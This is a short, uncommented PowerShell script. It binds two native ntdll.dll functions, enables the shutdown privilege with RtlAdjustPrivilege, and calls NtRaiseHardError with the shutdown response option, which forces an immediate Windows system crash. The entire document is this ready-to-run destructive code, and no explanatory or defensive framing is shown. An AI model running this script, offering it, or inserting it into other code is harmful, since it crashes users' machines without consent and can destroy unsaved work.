Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Ntdll {
        [DllImport("ntdll.dll")]
        public static extern int RtlAdjustPrivilege(int privilege, bool enablePrivilege, bool threadPrivilege, ref bool previousValue);

        [DllImport("ntdll.dll")]
        public static extern int NtRaiseHardError(uint errorStatus, int numberOfParameters, uint unicodeStringParameterMask, IntPtr[] parameters, uint validResponseOption, ref uint response);
    }
"@

$t1 = $false
$t2 = 0

[Ntdll]::RtlAdjustPrivilege(19, $true, $false, [ref]$t1)
[Ntdll]::NtRaiseHardError([System.UInt32]::MaxValue -band -1073741790, 0, 0, $null, 6, [ref]$t2)
